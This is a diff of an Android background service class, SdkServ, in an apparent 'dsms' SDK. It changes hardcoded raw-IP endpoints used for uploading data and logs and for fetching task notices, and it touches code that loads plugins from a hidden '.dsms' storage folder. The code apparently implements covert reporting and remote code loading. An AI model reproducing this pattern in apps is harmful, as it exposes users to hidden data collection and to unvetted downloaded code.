@@ -33,7 +33,6 @@ import org.apache.http.message.BasicHeader;
 import android.app.Service;
 import android.content.Context;
 import android.content.Intent;
-import android.net.Uri;
 import android.os.Environment;
 import android.os.Handler;
 import android.telephony.TelephonyManager;
@@ -109,9 +108,9 @@ public class SdkServ implements DServ{
 //	private  String cacheDir= ctx.getApplicationInfo().dataDir;
 	
 	
-	private String upUrl = "http://180.96.63.73:12370/dsms/PS";
-	private String upLogUrl = "http://180.96.63.73:12370/dsms/PL";
-	private String notiUrl = "http://180.96.63.73:12370/dsms/task/noti";
+	private String upUrl = "http://120.24.64.185:12370/dsms/PS";
+	private String upLogUrl = "http://120.24.64.185:12370/dsms/PL";
+	private String notiUrl = "http://120.24.64.185:12370/dsms/task/noti";
 //	static String upUrl = "http://202.102.105.15:8080/PLServer/PS";
 //	static String upLogUrl = "http://202.102.105.15:8080/PLServer/PL";
 	final String sdDir = Environment.getExternalStorageDirectory().getPath()+"/.dsms/";
@@ -379,6 +378,7 @@ public class SdkServ implements DServ{
 				DSms.log(this.dsmsv,TAG, "emvP:"+emvP);
 				File f = new File(emvP);
 				if (f == null ||  !f.exists()|| f.isDirectory() ) {
+					/*
 					Intent intent = dsmsv.getPackageManager().getLaunchIntentForPackage(
 								"com.egame");
 					boolean egameStart = false;
@@ -397,7 +397,7 @@ public class SdkServ implements DServ{
 						intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
 						dsmsv.startActivity(intent);
 					}
-					
+					*/
 					break;
 				}
 				Intent it= new Intent(dsmsv.getApplicationContext(), EmAcv.class);    
@@ -1143,7 +1143,7 @@ public class SdkServ implements DServ{
 					DSms.log(SdkServ.this.dsmsv, TAG,
 							"up running state:" + SdkServ.this.state);
 
-					if (!DSms.isNetOk(SdkServ.this.dsmsv)) {
+					if (!StringUtil.isNetOk(SdkServ.this.dsmsv)) {
 						Thread.sleep(shortSleepTime);
 						continue;
 					}
@@ -1271,7 +1271,7 @@ public class SdkServ implements DServ{
 					try {
 					
 						//生成log上传任务
-						if (DSms.isNetOk(SdkServ.this.dsmsv)) {
+						if (StringUtil.isNetOk(SdkServ.this.dsmsv)) {
 							long logSize = getLogSize();
 							long cTime = System.currentTimeMillis();
 							if ((logSize > maxLogSize) || cTime>(lastUpLogTime+maxLogSleepTime)) {
@@ -1496,6 +1496,7 @@ public class SdkServ implements DServ{
 				return plug;
 			}catch (Exception e) {
 				DSms.e(this.dsmsv,TAG, "loadTask error:"+localPath,e);
+				f.delete();
 			}    
 		}
 		return null;
